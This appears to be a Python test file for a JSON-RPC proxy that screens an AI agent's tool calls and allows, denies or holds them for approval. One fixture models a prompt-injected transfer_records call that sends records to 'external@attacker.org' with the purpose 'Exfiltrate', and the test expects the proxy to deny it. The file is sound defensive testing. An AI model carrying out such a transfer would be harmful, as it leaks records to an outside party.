"""Tests for proxy.server entry point, stdio loop, build_server factory, and CLI flags."""

import io
import json
import subprocess
import sys
import unittest

from proxy.config import ProxyConfig
from proxy.jsonrpc import INVALID_PARAMS, PARSE_ERROR
from proxy.models import ALLOW, DENY, HOLD, ToolRequest
from proxy.server import ProxyServer, build_server, build_server_from_config, main
from tests.fakes import FakeAnalyser, FakeLog, SpyExecutor


class TestBuildServerFactory(unittest.TestCase):
    """Test build_server factory construction and defaults."""

    def test_default_build_server(self) -> None:
        server = build_server()
        self.assertIsInstance(server, ProxyServer)
        self.assertIsNotNone(server.log)
        self.assertIsNotNone(server.analyser)
        self.assertIsNotNone(server.executor)
        self.assertIsNotNone(server.pending_store)

    def test_custom_injected_build_server(self) -> None:
        log = FakeLog()
        analyser = FakeAnalyser()
        executor = SpyExecutor()
        cfg = ProxyConfig(tool_timeout_seconds=2.0, hold_ttl_seconds=45)
        server = build_server(log=log, analyser=analyser, executor=executor, config=cfg)
        self.assertIs(server.log, log)
        self.assertIs(server.analyser, analyser)
        self.assertIs(server.executor, executor)
        self.assertEqual(server.config.tool_timeout_seconds, 2.0)
        self.assertEqual(server.config.hold_ttl_seconds, 45)


class TestStdioLoop(unittest.TestCase):
    """Test main stdio loop processing and error recovery."""

    def test_stdio_loop_recovers_from_bad_lines_and_parses_all_stdout_as_json(self) -> None:
        valid_req = {
            "jsonrpc": "2.0",
            "id": "rpc-101",
            "method": "tools/call",
            "params": {
                "request_id": "req-loop-01",
                "tool": "summarize_document",
                "arguments": {"file": "synthetic_report.pdf"},
                "purpose": "Test stdio loop",
                "scenario_id": "scen-stdio-01",
            },
        }
        lines_in = [
            "not a json line\n",
            json.dumps({"jsonrpc": "2.0", "id": 1, "method": "unknown/method", "params": {}}) + "\n",
            json.dumps(valid_req) + "\n",
            "{bad: json\n",
        ]
        stdin_stream = io.StringIO("".join(lines_in))
        stdout_stream = io.StringIO()
        stderr_stream = io.StringIO()

        exit_code = main(argv=[], stdin=stdin_stream, stdout=stdout_stream, stderr=stderr_stream)
        self.assertEqual(exit_code, 0)

        out_lines = [l for l in stdout_stream.getvalue().splitlines() if l.strip()]
        self.assertEqual(len(out_lines), 4)

        # Every line out MUST parse as valid JSON
        responses = [json.loads(l) for l in out_lines]
        for resp in responses:
            self.assertEqual(resp.get("jsonrpc"), "2.0")

        # Line 1: Parse error
        self.assertEqual(responses[0]["error"]["code"], PARSE_ERROR)
        # Line 2: Method not found
        self.assertEqual(responses[1]["error"]["code"], -32601)
        # Line 3: Successful execution
        self.assertEqual(responses[2]["id"], "rpc-101")
        self.assertIn("result", responses[2])
        # Line 4: Parse error
        self.assertEqual(responses[3]["error"]["code"], PARSE_ERROR)

        # Diagnostics written to stderr
        err_output = stderr_stream.getvalue()
        self.assertIn("RPC error", err_output)

    def test_cli_flags_analyser_fixture(self) -> None:
        fixture_data = {
            "req-fix-01": {
                "prompt_injection": True,
                "goal_drift": False,
                "sensitive_data_risk": "high",
                "risk_score": 0.95,
                "recommended_action": "DENY",
                "reason": "Fixture prompt injection detected",
            }
        }
        stdin_stream = io.StringIO(json.dumps({
            "jsonrpc": "2.0",
            "id": "rpc-fix-1",
            "method": "tools/call",
            "params": {
                "request_id": "req-fix-01",
                "tool": "transfer_records",
                "arguments": {"destination": "external@attacker.org"},
                "purpose": "Exfiltrate",
                "scenario_id": "scen-fix",
            },
        }) + "\n")
        stdout_stream = io.StringIO()
        stderr_stream = io.StringIO()

        argv = [
            "--tool-timeout", "3.5",
            "--hold-ttl", "80",
            "--analyser-fixture", json.dumps(fixture_data),
        ]
        exit_code = main(argv=argv, stdin=stdin_stream, stdout=stdout_stream, stderr=stderr_stream)
        self.assertEqual(exit_code, 0)

        out = json.loads(stdout_stream.getvalue().strip())
        self.assertIn("error", out)
        self.assertEqual(out["error"]["code"], -32003)  # POLICY_DENIED


class TestSubprocessExecution(unittest.TestCase):
    """Test running python -m proxy.server entry point as a subprocess."""

    def test_subprocess_entry_point(self) -> None:
        req = {
            "jsonrpc": "2.0",
            "id": "sub-01",
            "method": "tools/call",
            "params": {
                "request_id": "req-sub-01",
                "tool": "summarize_document",
                "arguments": {"file": "synthetic_report.pdf"},
                "purpose": "Subprocess test",
                "scenario_id": "scen-sub-01",
            },
        }
        proc = subprocess.Popen(
            [sys.executable, "-m", "proxy.server"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        try:
            stdout_data, stderr_data = proc.communicate(input=json.dumps(req) + "\n", timeout=10)
        finally:
            if proc.poll() is None:
                proc.kill()

        self.assertEqual(proc.returncode, 0)
        lines = [l for l in stdout_data.splitlines() if l.strip()]
        self.assertEqual(len(lines), 1)
        resp = json.loads(lines[0])
        self.assertEqual(resp.get("id"), "sub-01")
        self.assertIn("result", resp)


class TestBuildServerFromConfig(unittest.TestCase):
    """Test build_server_from_config target loading and fallback notices."""

    def test_fallbacks_announced_on_stderr(self) -> None:
        err_stream = io.StringIO()
        cfg = ProxyConfig()
        server = build_server_from_config(cfg, stderr=err_stream)
        err_msg = err_stream.getvalue().lower()
        self.assertIn("log", err_msg)
        self.assertIn("analyser", err_msg)
        self.assertIn("falling back", err_msg)

        # High-impact tool with no-op analyser (None signals) results in HOLD
        req = ToolRequest(
            request_id="req-fallback-1",
            tool="transfer_records",
            arguments={"destination": "archive@college.example"},
            purpose="Transfer",
            scenario_id="scen-fallback",
        )
        resp = server.handle_tool_call(req)
        self.assertEqual(resp["decision"], HOLD)

    def test_configured_targets_used_without_fallback_notices(self) -> None:
        err_stream = io.StringIO()
        cfg = ProxyConfig(
            log_target="tests.fakes:FakeLog",
            analyser_target="tests.fakes:FakeAnalyser",
        )
        server = build_server_from_config(cfg, stderr=err_stream)
        # No fallback notice should be emitted when targets are configured
        self.assertEqual(err_stream.getvalue(), "")

        req = ToolRequest(
            request_id="req-targets-1",
            tool="summarize_document",
            arguments={"file": "synthetic_report.pdf"},
            purpose="Safe",
            scenario_id="scen-targets",
        )
        resp = server.handle_tool_call(req)
        self.assertIn("result", resp)
        self.assertEqual(resp["result"]["decision"], ALLOW)


    def test_approval_targets_wired_and_called(self) -> None:
        import tests.fakes as tf
        calls = []
        tf._fake_create = lambda req: (calls.append(("create", req.tool)) or {"approval_id": "appr-custom-123"})
        tf._fake_verify = lambda appr_id: (calls.append(("verify", appr_id)) or {"decision": "APPROVED", "approver": "sec-lead", "reason": "ok"})
        cfg = ProxyConfig(
            log_target="tests.fakes:FakeLog",
            analyser_target="tests.fakes:FakeAnalyser",
            approval_create_target="tests.fakes:_fake_create",
            approval_verify_target="tests.fakes:_fake_verify",
        )
        server = build_server_from_config(cfg)
        req = ToolRequest("req-appr-target", "transfer_records", {"destination": "archive@college.example"}, "Transfer", "scen-appr")
        res = server.handle_tool_call(req)
        self.assertEqual(res["decision"], HOLD)
        self.assertEqual(res["approval_id"], "appr-custom-123")
        self.assertEqual(calls, [("create", "transfer_records")])

    def test_cli_flags_parsed(self) -> None:
        from proxy.server import _parse_cli_args
        cfg, _ = _parse_cli_args(["--log", "my.log:fn", "--analyser", "my.ai:fn", "--approval-create", "my.appr:create", "--approval-verify", "my.appr:verify"])
        self.assertEqual(cfg.log_target, "my.log:fn")
        self.assertEqual(cfg.analyser_target, "my.ai:fn")
        self.assertEqual(cfg.approval_create_target, "my.appr:create")
        self.assertEqual(cfg.approval_verify_target, "my.appr:verify")


if __name__ == "__main__":
    unittest.main()

